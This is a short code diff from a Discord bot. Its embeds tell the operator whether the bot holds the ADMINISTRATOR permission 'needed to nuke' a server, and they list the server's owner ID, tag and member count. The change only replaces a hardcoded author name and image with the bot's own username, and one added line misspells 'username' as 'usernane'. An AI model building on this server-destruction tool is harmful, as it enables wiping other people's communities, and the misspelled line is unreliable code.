@@ -696,7 +696,7 @@ client.on("message", msg => {
         const joinEmbed2 = new Discord.MessageEmbed()
         .setColor('#FF0435')
         .setTitle(`"${msg.guild.name}"`)
-        .setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
+        .setAuthor(client.user.usernane, pfp)
         .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
         .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
         
@@ -712,7 +712,7 @@ client.on("message", msg => {
             const joinEmbed = new Discord.MessageEmbed()
             .setColor('#FE2B54')
             .setTitle(`"${msg.guild.name}"`)
-            .setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
+            .setAuthor(client.user.username, pfp)
             .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`)
             .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
             .setColor('#FF0435')
